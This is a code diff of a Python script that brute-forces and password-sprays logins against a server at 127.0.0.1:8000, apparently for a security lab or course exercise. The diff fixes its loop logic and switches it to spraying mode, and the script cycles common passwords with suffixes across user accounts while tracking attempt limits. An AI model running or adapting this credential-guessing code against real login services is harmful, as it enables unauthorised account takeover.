@@ -7,9 +7,9 @@ import os
 
 
 LOCAL_ADDRESS = 'http://127.0.0.1:8000'
-DO_PASSWORD_SPARYING = 0 # 0 for brute force , 1 for password spraying
-LAST_USER = 31 # the last user to test
-FIRST_USER = 1 # the first user to test
+DO_PASSWORD_SPARYING = 1 # 0 for brute force , 1 for password spraying
+LAST_USER = 31 # the last user to test (11/21/31)
+FIRST_USER = 21 # the first user to test (1/11/21)
 
 def load_common_password():
     base_dir = os.path.dirname(__file__)
@@ -82,9 +82,9 @@ def brute_force(username):
     type = "login"
     code = ""
     i = 0 
-    answer = 0
+    answer = (0,"")
 
-    while answer != 200 or i < len(common_passwords):
+    while answer[0] != 200 and i < len(common_passwords):
         password = common_passwords[i]
         
         #check attempts limit
@@ -135,7 +135,7 @@ def brute_force(username):
                         code = generate_code()
 
                     
-    if answer == 200:
+    if answer[0] == 200:
         return 1       
     return 0
 
@@ -153,7 +153,7 @@ def start_password_spraying():
             result = password_sparying(password, session, start_time, attempt_count)
             if result[0]:
                 print("hacked!")
-                break
+                return
             else:
                 attempt_count = result[1]
             
@@ -165,14 +165,14 @@ def start_password_spraying():
                         current_password = password + suffix
                         result = password_sparying(current_password, session, start_time, attempt_count)
                         if result[0]:
-                            break
+                            return
                         else:
                             attempt_count = result[1]
                             
         except Exception as e:
             print("EXCEPTION:", e)
             print('error in sending info to the server')
-            break
+            return
 
 
 def password_sparying(password, session, start_time,attempt_count):
@@ -182,8 +182,8 @@ def password_sparying(password, session, start_time,attempt_count):
     code = None
     type = None
     i = FIRST_USER
-    answer = 0
-    while answer != 200 and i < LAST_USER:
+    answer = (0,"")
+    while answer[0] != 200 and i < LAST_USER:
         #check attempts limit
         if attempt_count >= max_attempts:
             print("Reached maximum attempts limit.")
@@ -209,8 +209,8 @@ def password_sparying(password, session, start_time,attempt_count):
         else:
             i += 1
 
-    if answer == 200:
-            return (1, attempt_count)
+    if answer[0] == 200:
+        return (1, attempt_count)
     
     return (0, attempt_count)
 
@@ -225,7 +225,8 @@ def generate_code():
 def main():
     if DO_PASSWORD_SPARYING:
         start_password_spraying()
-    start_brute_force()
+    else:
+        start_brute_force()
 
 
 if __name__ == '__main__':
